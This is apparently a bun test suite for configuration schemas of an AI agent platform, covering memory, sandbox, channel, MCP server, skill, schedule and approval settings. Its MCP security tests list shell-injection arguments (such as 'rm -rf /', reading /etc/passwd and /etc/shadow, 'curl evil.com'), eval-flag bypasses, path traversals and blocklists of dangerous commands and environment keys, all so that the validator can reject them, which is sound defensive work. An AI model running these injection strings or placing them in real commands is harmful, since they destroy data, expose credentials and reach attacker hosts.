import { describe, expect, test } from 'bun:test';
import { ALLOWED_STDIO_COMMANDS } from '../mcp-security';
import {
  createApprovalPolicySchema,
  createChannelSchema,
  createMCPConfigSchema,
  createScheduleSchema,
  createSkillSchema,
  memoryCategorySchema,
  memoryConfigSchema,
  memorySaveSchema,
  memorySearchSchema,
  sandboxConfigSchema,
  updateMemorySchema,
} from '../schemas';

describe('memoryConfigSchema', () => {
  test('applies defaults', () => {
    const result = memoryConfigSchema.parse({});
    expect(result.maxMemories).toBe(200);
    expect(result.injectTopN).toBe(10);
  });

  test('accepts valid overrides', () => {
    const result = memoryConfigSchema.parse({ maxMemories: 50, injectTopN: 5 });
    expect(result.maxMemories).toBe(50);
    expect(result.injectTopN).toBe(5);
  });

  test('rejects non-positive maxMemories', () => {
    expect(() => memoryConfigSchema.parse({ maxMemories: 0 })).toThrow();
    expect(() => memoryConfigSchema.parse({ maxMemories: -1 })).toThrow();
  });

  test('rejects non-integer values', () => {
    expect(() => memoryConfigSchema.parse({ maxMemories: 1.5 })).toThrow();
  });

  test('allows optional embeddingModel', () => {
    const result = memoryConfigSchema.parse({ embeddingModel: 'text-embedding-3-small' });
    expect(result.embeddingModel).toBe('text-embedding-3-small');
  });
});

describe('sandboxConfigSchema', () => {
  test('applies all defaults', () => {
    const result = sandboxConfigSchema.parse({});
    expect(result.allowedCommands).not.toContain('bash');
    expect(result.allowedCommands).not.toContain('sh');
    expect(result.allowedCommands).toContain('git');
    expect(result.allowedCommands).toContain('npx');
    expect(result.allowedCommands).toContain('bunx');
    expect(result.allowedCommands).toContain('sort');
    expect(result.allowedCommands).toContain('uniq');
    expect(result.deniedPatterns).toHaveLength(3);
    expect(result.maxExecutionTimeS).toBe(60);
    expect(result.maxWorkspaceSizeMb).toBe(256);
    expect(result.networkAccess).toBe(true);
    expect(result.gitTokenEnvVar).toBeNull();
  });

  test('rejects ReDoS-vulnerable deniedPatterns (a+)+', () => {
    expect(() => sandboxConfigSchema.parse({ deniedPatterns: ['(a+)+$'] })).toThrow('ReDoS');
  });

  test('rejects ReDoS-vulnerable deniedPatterns ([a-z]+)+', () => {
    expect(() => sandboxConfigSchema.parse({ deniedPatterns: ['([a-z]+)+'] })).toThrow('ReDoS');
  });

  test('accepts safe deniedPatterns', () => {
    const result = sandboxConfigSchema.parse({ deniedPatterns: ['\\brm\\b', 'mkfs'] });
    expect(result.deniedPatterns).toEqual(['\\brm\\b', 'mkfs']);
  });

  test('rejects maxExecutionTimeS out of bounds', () => {
    expect(() => sandboxConfigSchema.parse({ maxExecutionTimeS: 0 })).toThrow();
    expect(() => sandboxConfigSchema.parse({ maxExecutionTimeS: 301 })).toThrow();
  });

  test('accepts maxExecutionTimeS at bounds', () => {
    expect(sandboxConfigSchema.parse({ maxExecutionTimeS: 1 }).maxExecutionTimeS).toBe(1);
    expect(sandboxConfigSchema.parse({ maxExecutionTimeS: 300 }).maxExecutionTimeS).toBe(300);
  });

  test('rejects empty string in allowedCommands', () => {
    expect(() => sandboxConfigSchema.parse({ allowedCommands: [''] })).toThrow();
  });
});

describe('createChannelSchema', () => {
  const minimal = { externalId: 'C12345' };

  test('accepts minimal valid input with defaults', () => {
    const result = createChannelSchema.parse(minimal);
    expect(result.platform).toBe('slack');
    expect(result.model).toBe('claude-sonnet-4-20250514');
    expect(result.provider).toBe('anthropic');
    expect(result.maxIterations).toBe(10);
    expect(result.heartbeatEnabled).toBe(false);
    expect(result.promptInjectMode).toBe('every-turn');
    expect(result.threadReplyMode).toBe('all');
    expect(result.autonomyLevel).toBe('balanced');
    expect(result.sandboxEnabled).toBe(true);
    expect(result.browserEnabled).toBe(false);
  });

  test('rejects missing externalId', () => {
    expect(() => createChannelSchema.parse({})).toThrow();
  });

  test('rejects empty externalId', () => {
    expect(() => createChannelSchema.parse({ externalId: '' })).toThrow();
  });

  test('accepts all valid platforms', () => {
    for (const platform of ['slack', 'discord', 'teams', 'cli'] as const) {
      const result = createChannelSchema.parse({ externalId: 'X', platform });
      expect(result.platform).toBe(platform);
    }
  });

  test('rejects invalid platform', () => {
    expect(() => createChannelSchema.parse({ externalId: 'X', platform: 'whatsapp' })).toThrow();
  });

  test('rejects maxIterations out of range', () => {
    expect(() => createChannelSchema.parse({ externalId: 'X', maxIterations: 0 })).toThrow();
    expect(() => createChannelSchema.parse({ externalId: 'X', maxIterations: 51 })).toThrow();
  });

  test('accepts valid autonomyLevel values', () => {
    for (const level of ['cautious', 'balanced', 'autonomous'] as const) {
      const result = createChannelSchema.parse({ externalId: 'X', autonomyLevel: level });
      expect(result.autonomyLevel).toBe(level);
    }
  });

  test('accepts valid promptInjectMode values', () => {
    for (const mode of ['every-turn', 'once', 'minimal'] as const) {
      const result = createChannelSchema.parse({ externalId: 'X', promptInjectMode: mode });
      expect(result.promptInjectMode).toBe(mode);
    }
  });
});

describe('createMCPConfigSchema', () => {
  test('accepts valid stdio config', () => {
    const result = createMCPConfigSchema.parse({
      serverName: 'my-mcp',
      transportType: 'stdio',
      command: 'npx',
    });
    expect(result.transportType).toBe('stdio');
    expect(result.command).toBe('npx');
  });

  test('accepts valid sse config', () => {
    const result = createMCPConfigSchema.parse({
      serverName: 'my-mcp',
      transportType: 'sse',
      serverUrl: 'https://mcp.example.com',
    });
    expect(result.transportType).toBe('sse');
    expect(result.serverUrl).toBe('https://mcp.example.com');
  });

  test('accepts valid http config', () => {
    const result = createMCPConfigSchema.parse({
      serverName: 'my-mcp',
      transportType: 'http',
      serverUrl: 'https://mcp.example.com',
    });
    expect(result.transportType).toBe('http');
  });

  test('rejects stdio without command', () => {
    expect(() =>
      createMCPConfigSchema.parse({
        serverName: 'my-mcp',
        transportType: 'stdio',
      }),
    ).toThrow();
  });

  test('rejects sse without serverUrl', () => {
    expect(() =>
      createMCPConfigSchema.parse({
        serverName: 'my-mcp',
        transportType: 'sse',
      }),
    ).toThrow();
  });

  test('rejects http without serverUrl', () => {
    expect(() =>
      createMCPConfigSchema.parse({
        serverName: 'my-mcp',
        transportType: 'http',
      }),
    ).toThrow();
  });

  test('defaults to sse transport', () => {
    const result = createMCPConfigSchema.parse({
      serverName: 'my-mcp',
      serverUrl: 'https://mcp.example.com',
    });
    expect(result.transportType).toBe('sse');
  });

  test('defaults channelId to null (global config)', () => {
    const result = createMCPConfigSchema.parse({
      serverName: 'my-mcp',
      serverUrl: 'https://mcp.example.com',
    });
    expect(result.channelId).toBeNull();
  });

  // --- Security tests (issue #5) ---

  describe('command allowlist', () => {
    for (const cmd of ALLOWED_STDIO_COMMANDS) {
      test(`allows command: "${cmd}"`, () => {
        const result = createMCPConfigSchema.parse({
          serverName: 'ok',
          transportType: 'stdio',
          command: cmd,
        });
        expect(result.command).toBe(cmd);
      });
    }

    const disallowed = ['bash', 'sh', 'curl', 'rm', 'wget', '/usr/bin/mcp-server', 'python'];
    for (const cmd of disallowed) {
      test(`rejects command: "${cmd}"`, () => {
        expect(() =>
          createMCPConfigSchema.parse({
            serverName: 'evil',
            transportType: 'stdio',
            command: cmd,
          }),
        ).toThrow();
      });
    }
  });

  describe('env blocklist', () => {
    const dangerousKeys = [
      'LD_PRELOAD',
      'NODE_OPTIONS',
      'PATH',
      'DYLD_INSERT_LIBRARIES',
      'BASH_ENV',
    ];
    for (const key of dangerousKeys) {
      test(`rejects env key: "${key}"`, () => {
        expect(() =>
          createMCPConfigSchema.parse({
            serverName: 'evil',
            transportType: 'stdio',
            command: 'npx',
            env: { [key]: '/tmp/evil' },
          }),
        ).toThrow();
      });
    }

    test('rejects env key case-insensitively', () => {
      expect(() =>
        createMCPConfigSchema.parse({
          serverName: 'evil',
          transportType: 'stdio',
          command: 'npx',
          env: { ld_preload: '/tmp/evil.so' },
        }),
      ).toThrow();
    });

    test('allows safe env vars', () => {
      const result = createMCPConfigSchema.parse({
        serverName: 'ok',
        transportType: 'stdio',
        command: 'npx',
        env: { MCP_API_KEY: 'secret', DEBUG: 'true' },
      });
      expect(result.env).toEqual({ MCP_API_KEY: 'secret', DEBUG: 'true' });
    });
  });

  describe('args validation', () => {
    const maliciousArgs: string[][] = [
      ['--flag; rm -rf /'],
      ['valid', '| cat /etc/passwd'],
      ['&& curl evil.com'],
      ['$(whoami)'],
      // biome-ignore lint/suspicious/noTemplateCurlyInString: intentional shell injection test
      ['${IFS}'],
      ['`id`'],
      ['> /etc/passwd'],
      ['< /etc/shadow'],
      ['line1\nline2'],
      ['null\0byte'],
    ];
    for (const args of maliciousArgs) {
      test(`rejects args with shell metacharacters: ${JSON.stringify(args)}`, () => {
        expect(() =>
          createMCPConfigSchema.parse({
            serverName: 'evil',
            transportType: 'stdio',
            command: 'npx',
            args,
          }),
        ).toThrow();
      });
    }

    test('rejects more than 20 args', () => {
      expect(() =>
        createMCPConfigSchema.parse({
          serverName: 'evil',
          transportType: 'stdio',
          command: 'npx',
          args: Array.from({ length: 21 }, (_, i) => `arg${i}`),
        }),
      ).toThrow();
    });

    test('rejects arg exceeding 1000 chars', () => {
      expect(() =>
        createMCPConfigSchema.parse({
          serverName: 'evil',
          transportType: 'stdio',
          command: 'npx',
          args: ['a'.repeat(1001)],
        }),
      ).toThrow();
    });

    test('allows safe args', () => {
      const result = createMCPConfigSchema.parse({
        serverName: 'ok',
        transportType: 'stdio',
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-filesystem', '/home/user/projects'],
      });
      expect(result.args).toEqual([
        '-y',
        '@modelcontextprotocol/server-filesystem',
        '/home/user/projects',
      ]);
    });
  });

  describe('eval flag validation', () => {
    const evalFlags = ['-e', '--eval', '-p', '--print', '-c'];
    for (const flag of evalFlags) {
      test(`rejects eval flag: ${flag}`, () => {
        expect(() =>
          createMCPConfigSchema.parse({
            serverName: 'evil',
            transportType: 'stdio',
            command: 'node',
            args: [flag, 'process.exit(1)'],
          }),
        ).toThrow('eval');
      });
    }

    test('allows non-eval flags', () => {
      const result = createMCPConfigSchema.parse({
        serverName: 'ok',
        transportType: 'stdio',
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-filesystem'],
      });
      expect(result.args).toEqual(['-y', '@modelcontextprotocol/server-filesystem']);
    });

    const evalBypasses: { label: string; args: string[] }[] = [
      { label: '--eval=code', args: ['--eval=process.exit(1)'] },
      { label: '-ecode (concatenated)', args: ['-eprocess.exit(1)'] },
      { label: '--print=expr', args: ['--print=process.env'] },
      { label: '-p"expr" (concatenated)', args: ['-p"process.env"'] },
      { label: 'positional eval subcommand', args: ['eval', 'Deno.exit(1)'] },
    ];

    for (const { label, args } of evalBypasses) {
      test(`rejects eval bypass: ${label}`, () => {
        expect(() =>
          createMCPConfigSchema.parse({
            serverName: 'evil',
            transportType: 'stdio',
            command: 'node',
            args,
          }),
        ).toThrow('eval');
      });
    }
  });

  describe('cwd validation', () => {
    const traversalPaths = ['../etc/passwd', '/home/../../etc', '..', 'a/b/../../../c'];
    for (const cwd of traversalPaths) {
      test(`rejects path traversal: "${cwd}"`, () => {
        expect(() =>
          createMCPConfigSchema.parse({
            serverName: 'evil',
            transportType: 'stdio',
            command: 'npx',
            cwd,
          }),
        ).toThrow();
      });
    }

    test('rejects cwd exceeding 500 chars', () => {
      expect(() =>
        createMCPConfigSchema.parse({
          serverName: 'evil',
          transportType: 'stdio',
          command: 'npx',
          cwd: '/a'.repeat(251),
        }),
      ).toThrow();
    });

    test('allows safe absolute cwd', () => {
      const result = createMCPConfigSchema.parse({
        serverName: 'ok',
        transportType: 'stdio',
        command: 'npx',
        cwd: '/home/user/mcp-servers',
      });
      expect(result.cwd).toBe('/home/user/mcp-servers');
    });
  });
});

describe('createSkillSchema', () => {
  const valid = {
    channelId: '550e8400-e29b-41d4-a716-446655440000',
    name: 'Deploy Helper',
    content: 'Helps with deployments',
  };

  test('accepts valid input', () => {
    const result = createSkillSchema.parse(valid);
    expect(result.name).toBe('Deploy Helper');
    expect(result.allowedTools).toEqual([]);
    expect(result.enabled).toBe(true);
  });

  test('rejects empty name', () => {
    expect(() => createSkillSchema.parse({ ...valid, name: '' })).toThrow();
  });

  test('rejects non-UUID channelId', () => {
    expect(() => createSkillSchema.parse({ ...valid, channelId: 'not-a-uuid' })).toThrow();
  });

  test('rejects empty content', () => {
    expect(() => createSkillSchema.parse({ ...valid, content: '' })).toThrow();
  });

  test('accepts name at max length (100)', () => {
    const result = createSkillSchema.parse({ ...valid, name: 'a'.repeat(100) });
    expect(result.name.length).toBe(100);
  });

  test('rejects name over 100 chars', () => {
    expect(() => createSkillSchema.parse({ ...valid, name: 'a'.repeat(101) })).toThrow();
  });
});

describe('memoryCategorySchema', () => {
  const validCategories = ['fact', 'preference', 'decision', 'person', 'project', 'procedure'];

  test('accepts all valid categories', () => {
    for (const cat of validCategories) {
      expect(memoryCategorySchema.parse(cat)).toBe(cat);
    }
  });

  test('rejects invalid category', () => {
    expect(() => memoryCategorySchema.parse('invalid')).toThrow();
    expect(() => memoryCategorySchema.parse('')).toThrow();
  });
});

describe('memorySaveSchema', () => {
  test('accepts valid input with default category', () => {
    const result = memorySaveSchema.parse({ content: 'User prefers dark mode' });
    expect(result.content).toBe('User prefers dark mode');
    expect(result.category).toBe('fact');
  });

  test('rejects empty content', () => {
    expect(() => memorySaveSchema.parse({ content: '' })).toThrow();
  });

  test('accepts explicit category', () => {
    const result = memorySaveSchema.parse({ content: 'test', category: 'preference' });
    expect(result.category).toBe('preference');
  });
});

describe('memorySearchSchema', () => {
  test('applies default limit', () => {
    const result = memorySearchSchema.parse({ query: 'search term' });
    expect(result.limit).toBe(10);
  });

  test('rejects empty query', () => {
    expect(() => memorySearchSchema.parse({ query: '' })).toThrow();
  });

  test('rejects limit out of range', () => {
    expect(() => memorySearchSchema.parse({ query: 'test', limit: 0 })).toThrow();
    expect(() => memorySearchSchema.parse({ query: 'test', limit: 51 })).toThrow();
  });
});

describe('updateMemorySchema', () => {
  test('accepts partial update with content', () => {
    const result = updateMemorySchema.parse({ content: 'updated' });
    expect(result.content).toBe('updated');
    expect(result.category).toBeUndefined();
  });

  test('accepts partial update with category', () => {
    const result = updateMemorySchema.parse({ category: 'decision' });
    expect(result.category).toBe('decision');
    expect(result.content).toBeUndefined();
  });

  test('rejects empty content', () => {
    expect(() => updateMemorySchema.parse({ content: '' })).toThrow();
  });
});

describe('createScheduleSchema', () => {
  const valid = {
    channelId: '550e8400-e29b-41d4-a716-446655440000',
    name: 'Daily standup',
    cronExpression: '0 9 * * *',
    prompt: 'Summarize yesterday',
  };

  test('accepts valid input with defaults', () => {
    const result = createScheduleSchema.parse(valid);
    expect(result.enabled).toBe(true);
    expect(result.notifyUsers).toEqual([]);
  });

  test('rejects missing required fields', () => {
    expect(() => createScheduleSchema.parse({})).toThrow();
    expect(() => createScheduleSchema.parse({ channelId: valid.channelId })).toThrow();
  });
});

describe('createApprovalPolicySchema', () => {
  const valid = {
    channelId: '550e8400-e29b-41d4-a716-446655440000',
    toolName: 'deploy_production',
  };

  test('accepts valid input with default policy', () => {
    const result = createApprovalPolicySchema.parse(valid);
    expect(result.policy).toBe('ask');
    expect(result.allowedUsers).toEqual([]);
  });

  test('accepts all policy values', () => {
    for (const policy of ['ask', 'allowlist', 'deny', 'auto'] as const) {
      const result = createApprovalPolicySchema.parse({ ...valid, policy });
      expect(result.policy).toBe(policy);
    }
  });

  test('rejects empty toolName', () => {
    expect(() => createApprovalPolicySchema.parse({ ...valid, toolName: '' })).toThrow();
  });
});
